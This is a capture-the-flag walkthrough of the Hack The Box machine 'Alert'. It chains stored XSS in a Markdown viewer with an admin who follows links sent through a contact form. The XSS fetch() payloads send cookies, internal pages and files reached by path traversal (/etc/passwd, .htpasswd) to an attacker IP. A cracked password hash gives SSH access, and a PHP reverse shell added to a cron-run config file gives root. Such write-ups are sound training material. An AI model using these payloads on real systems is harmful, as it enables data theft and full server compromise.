# Alert - Easy

```sh
sudo vim /etc/hosts
# add alert.htb

nmap -T4 -p- -A -Pn -v alert.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
    * 80/tcp - http - Apache httpd 2.4.41

* the webpage leads to 'http://alert.htb/index.php?page=alert', and is a Markdown Viewer page - it has an upload file option as well

* other linked pages include -

    * 'http://alert.htb/index.php?page=contact' - this contact page includes an input form with email and message fields; source code shows it uses '/contact.php' for the form
    * 'http://alert.htb/index.php?page=about' - the about page mentions the administrator reviews contact messages and reports errors; this could possibly indicate some form of session-related attacks
    * 'http://alert.htb/index.php?page=donate' - the donate page includes a form to select a number for donation

* web enumeration:

    ```sh
    gobuster dir -u http://alert.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md,js,db -t 25
    # dir scan

    ffuf -c -u 'http://alert.htb' -H 'Host: FUZZ.alert.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 20 -s
    # subdomain scan
    ```

* checking the source code for the homepage shows the upload form uses the page at '/visualizer.php' and seems to accept only '.md' files

* the subdomain scan using ```ffuf``` gives us another domain 'statistics.alert.htb' - add this entry to ```/etc/hosts```

* if we navigate to 'http://statistics.alert.htb/', we get a basic auth login; trying common creds like 'admin:admin' does not work and we get 401 Unauthorized

* we can check this subdomain later in case we find valid creds

* the directory scan using ```gobuster``` gives us a few more pages -

    * /contact.php - this gives the message 'Error: Invalid request'
    * /uploads - 403 Forbidden
    * /messages - 403 Forbidden
    * /messages.php - this is a blank page

* we can test the homepage and the contact page now, using Burp Suite to intercept and check the requests

* testing the homepage:

    * the upload option accepts only Markdown (.md) files

    * once uploaded, a POST request to /visualizer.php is sent with the file data - this is sent with the 'Content-Type: text/markdown' header

    * the response shows the file contents rendered in Markdown format

    * the page also includes a share link - this leads to a link like 'http://alert.htb/visualizer.php?link_share=698e015318a9b5.35246405.md' - the filename cannot be decoded from anything

    * if we check for the file uploads in the directory found earlier, we can find the file uploaded at 'http://alert.htb/uploads/698e01467e0898.39209217.md'

    * however, as the filename is randomized, we cannot upload a webshell and find it in the uploads directory

    * we can test for any server-side attacks by injecting a URL linking to our server - setup a server using ```python3 -m http.server```

    * if we use any links pointing to the server - with a payload like ```[link](http://10.10.14.95:8000/testfile)``` - embedded in the Markdown file, we can click the link on rendering the page and a response is received on our server

    * we can also try for XSS attacks at this point - we can test with a common payload like ```<script>alert('XSS')</script>``` in the Markdown file

    * this works, and when we click on 'View Markdown', the pop-up is seen - and is persistent on reloading the page

    * this means the markdown viewer is vulnerable to stored XSS

* testing the contact page next, as the admin checks the contact messages & errors:

    * the contact form has two fields - email & message, where the email field is validated; we can enter test data and submit

    * the data is sent in the format 'email=test%40email.com&message=test+message' in a POST request to /contact.php

    * submitting the form leads to a GET request to '/index.php?page=contact&status=Message%20sent%20successfully!' - this shows another query parameter 'status'

    * to test for server-side attacks, submit the value 'http://10.10.14.95:8000/test' in the message field

    * if we submit the contact form, we see it is successful and we get a response on our server - this indicates the admin is accessing the HTTP link

    * we can try for XSS payloads on this page as well, but this does not work as the message field interprets everything after 'http', so we cannot inject anything here

* we can combine the XSS vuln in the markdown viewer, with the link being accessed by admin in the contact page, to attempt a session stealing attack:

    * we can create a Markdown file with a payload to fetch the ```document.cookie``` value to check for any cookies:

        ```md
        <script>fetch('http://10.10.14.95:8000/?c=' + document.cookie);</script>
        ```
    
    * next, we can upload this Markdown file for viewing in the homepage; once processed, we can copy the link to share this Markdown file

    * then, in the contact page, we can enter this share link in the message field and submit the form

    * we are able to see a response, but no cookie value is received - indicating that there aren't any cookies associated for this webpage

* as the cookie stealing attempt has failed, we can attempt another approach - we can try to fetch & read other PHP files on the webpage, like 'contact.php', 'visualizer.php', and 'messages.php':

    * we can create a Markdown file with the payload to fetch all 3 PHP pages (we need to use the full URL as mentioning only the page name gives an error for 'invalid request'):

        ```md
        <script>
            fetch('http://alert.htb/contact.php')
            .then(response => response.text())
            .then(contact => {
                fetch('http://10.10.14.95:8000/?c=' + btoa(contact));
            });
            fetch('http://alert.htb/visualizer.php')
            .then(response => response.text())
            .then(visualizer => {
                fetch('http://10.10.14.95:8000/?v=' + btoa(visualizer));
            });
            fetch('http://alert.htb/messages.php')
            .then(response => response.text())
            .then(messages => {
                fetch('http://10.10.14.95:8000/?m=' + btoa(messages));
            });
        </script>
        ```
    
    * next, upload this Markdown file with the above XSS payloads for data exfiltration, and copy the 'Share Markdown' link

    * then, in the contact form, paste the copied share link in the message field and submit the form

    * we can see the base64-encoded data on our Python server - we can decode this in CyberChef

* decoding the data for 'contact.php' gives 'Error: Invalid request' - which means the file does not likely exist; similarly, the data for 'visualizer.php' does not give anything interesting

* the data for 'messages.php' reveals the link 'messages.php?file=2024-03-10_15-48-34.txt' - indicating a text file is present in the webapp

* if we navigate to 'http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt', we get a blank file; similarly, checking if the file is uploaded in the '/messages' directory also gives a blank page

* we can try to fetch this file using the same XSS technique:

    * create the Markdown file with the payload:

        ```md
        <script>
            fetch('http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt')
            .then(response => response.text())
            .then(data => {
                fetch('http://10.10.14.95:8000/?c=' + btoa(data));
            });
        </script>
        ```
    
    * upload the Markdown file in the viewer, and copy the 'Share Markdown' link

    * paste the copied link in the message field in the contact form, and submit

    * in our Python server, we get the base64-encoded data response as ```<pre></pre>```

    * this could either indicate the file is empty or missing

* we are unable to read the contents of the text file, but as the 'file' parameter exists for 'messages.php', we can check if we are able to read any local files:

    * create a Markdown file with multiple possible payloads for local file read - we can try checking for ```/etc/passwd```:

        ```md
        <script>
            fetch('http://alert.htb/messages.php?file=/etc/passwd')
            .then(response => response.text())
            .then(data => {
                fetch('http://10.10.14.95:8000/?first=' + btoa(data));
            });
            fetch('http://alert.htb/messages.php?file=../../../etc/passwd')
            .then(response => response.text())
            .then(data => {
                fetch('http://10.10.14.95:8000/?second=' + btoa(data));
            });
            fetch('http://alert.htb/messages.php?file=../../../../../../../etc/passwd')
            .then(response => response.text())
            .then(data => {
                fetch('http://10.10.14.95:8000/?third=' + btoa(data));
            });
        </script>
        ```
    
    * then, upload the Markdown file and copy the 'Share Markdown' link; and paste the copied link in the message field in the contact form and submit

    * if we view the responses on our Python server, we can see the first two LFI payloads did not work, but the third LFI payload ```../../../../../../../etc/passwd``` worked, and we have the base64-encoded ```/etc/passwd```

* the ```/etc/passwd``` file discloses 2 users - 'albert' & 'david' - on the box

* as we have LFI now, we can try to read other common files

* as we have the 'statistics.alert.htb' domain, which is using basic authentication - its credentials would be stored in ```.htpasswd``` file in Apache webapps

* to confirm this, we can review the Apache web config files like ```/etc/apache2/apache2.conf```, and vhost config files like ```/etc/apache2/sites-available/000-default.conf``` - since we want to check for a subdomain

* we can use the same method as above to read the Apache config files - and we get the base64-encoded responses on our server

* reading the ```/etc/apache2/sites-available/000-default.conf``` file works and it discloses the auth file location at ```/var/www/statistics.alert.htb/.htpasswd```

* we can read this file using the same XSS payload method - and this gives us the hash for 'albert' user - ```albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/```

* ```hashcat``` docs show that this is a Apache MD5 hash - mode 1600 - we can crack it now:

    ```sh
    vim albert
    # paste the hash

    hashcat -m 1600 albert /usr/share/wordlists/rockyou.txt
    # crack the hash
    ```

* ```hashcat``` cracks the hash to give the cleartext 'manchesterunited' - we can try to login via SSH now:

    ```sh
    ssh albert@alert.htb
    # this works

    cat user.txt
    # user flag

    ls -la

    ls -la /home/david
    # permission denied

    sudo -l
    # cannot run as sudo

    # we can use linpeas for further enumeration - fetch script from attacker

    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-200-generic, Ubuntu 20.04.6
    * user 'albert' is part of a non-default group 'management'
    * non-default files found in ```/opt```
    * cron jobs & processes running for files in ```/opt/website-monitor```
    * SUID set for non-default binary ```/opt/google/chrome/chrome-sandbox```
    * 'management' group can write some files in ```/opt/website-monitor/```
    * non-default backup file ```/var/backups/backup.zip``` found

* we can check the ZIP file first if it contains any info - we can transfer using ```scp```:

    ```sh
    # on attacker
    scp albert@alert.htb:/var/backups/backup.zip backup.zip

    unzip backup.zip
    # the file is asking for a password
    # and 'albert' user password is not working

    # try to crack the zip file using john
    zip2john backup.zip > backup.hash

    john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
    # this fails
    ```

* we are unable to crack the password for the ZIP file, but it does show that the ZIP file is a backup of the 'alert.htb' website - we can continue to check for other privesc vectors

* checking the ```/opt``` directory, we have two apps - ```/opt/google```, and ```/opt/website-monitor``` - we can check both of them:

    ```sh
    ls -la /opt

    ls -la /opt/google

    ls -la /opt/google/chrome
    ```

* the ```chrome-sandbox``` binary has SUID bit set, but Googling for exploits related to privesc does not give anything useful in this situation

* checking the 'website-monitor' files:

    ```sh
    ls -la /opt/website-monitor/
    # we have write permissions here for some files

    cat /opt/website-monitor/monitor.php

    cat /opt/website-monitor/config/configuration.php
    ```

* the ```/opt/website-monitor/monitor.php``` file is a script for monitoring websites stored in ```/opt/website-monitor/monitors.json```

* the script also has the config line ```include('config/configuration.php');``` - which indicates it is executing the PHP code from that file

* the script mentions that it can be run as a cronjob every minute - we can verify if this is the case, using ```pspy```:

    ```sh
    # fetch pspy from attacker

    wget http://10.10.14.95:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* ```pspy``` confirms that ```/opt/website-monitor/monitor.php``` is being executed every minute by root

* while we do not have write permissions on this file, we have write permissions on ```/opt/website-monitor/config/configuration.php``` - so we can append a PHP reverse-shell one-liner to it

* setup a listener on attacker using ```nc -nvlp 5555```, and edit the config file on target:

    ```sh
    nano /opt/website-monitor/config/configuration.php
    # append the reverse-shell one-liner
    ```

    ```php
    <?php
    define('PATH', '/opt/website-monitor');
    $sock=fsockopen("10.10.14.95",5555);system("sh <&3 >&3 2>&3");
    ?>
    ```

    ```sh
    # on attacker
    # we get reverse-shell in a minute

    id
    # root

    cat /root/root.txt
    # root flag
    ```
